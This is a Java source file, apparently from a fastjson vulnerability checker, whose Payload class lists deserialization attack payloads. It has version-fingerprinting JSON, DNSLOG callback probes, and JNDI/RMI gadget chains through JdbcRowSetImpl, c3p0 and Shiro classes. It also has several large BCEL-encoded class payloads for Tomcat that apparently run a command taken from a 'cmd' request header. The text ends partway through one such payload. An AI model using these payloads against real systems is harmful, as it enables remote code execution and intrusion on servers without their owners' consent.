package org.Checker;

import java.util.ArrayList;
import java.util.List;

public class Payload {
    //定义保存payload

    public static List<Vulnerability> getPayload() {
        List<Vulnerability> vulnerabilities = new ArrayList<>();
        vulnerabilities.add(new Vulnerability("Check Version -1", "【不报错】1.2.83/1.2.24 【报错】1.2.25-1.2.80", "{\"zero\":{\"@type\":\"java.lang.Exception\",\"@type\":\"org.XxException\"}}"));
        vulnerabilities.add(new Vulnerability("Check Version -2", "【不报错】1.2.24-1.2.68 【报错】1.2.70-1.2.83", "{\"zero\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"}}"));
        vulnerabilities.add(new Vulnerability("Check Version -3", "【不报错】1.2.24-1.2.47 【报错】1.2.48-1.2.83", "{\n" +
                "    \"a\": {\n" +
                "        \"@type\": \"java.lang.Class\", \n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }, \n" +
                "    \"b\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check Version -4", "【不报错】1.2.24 【报错】1.2.25-1.2.83", "{\"zero\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\"}}"));
        vulnerabilities.add(new Vulnerability("DNSLOG -1", "替换DNSLOG地址，等待回显", "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog.com\"}}"));
        vulnerabilities.add(new Vulnerability("DNSLOG -2", "替换DNSLOG地址，等待回显", "{{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog.com\"}:\"a\"}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 Jdbc", "JdbcRowSetImpl", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", \"autoCommit\":true}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 c3p0", "c3p0#JndiRefForwardingDataSource", "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"rmi://127.0.0.1:1099/badClassName\", \"loginTimeout\":0}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 shiro1", "shiro#JndiObjectFactory", "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\", \"resourceName\":\"rmi://127.0.0.1:9050/exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 shiro2", "shiro#JndiRealmFactory", "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":\"rmi://127.0.0.1:9050/exploit\"}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 bcel1", "tomcat7，请求头添加cmd: whoami", "{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 bcel2", "tomcat8，请求头添加cmd: whoami", "{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 bcel3", "tomcat7，请求头添加cmd: whoami", "{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1222-1224 bcel4", "tomcat8，请求头添加cmd: whoami", "{\n" +
                "    {\n" +
                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d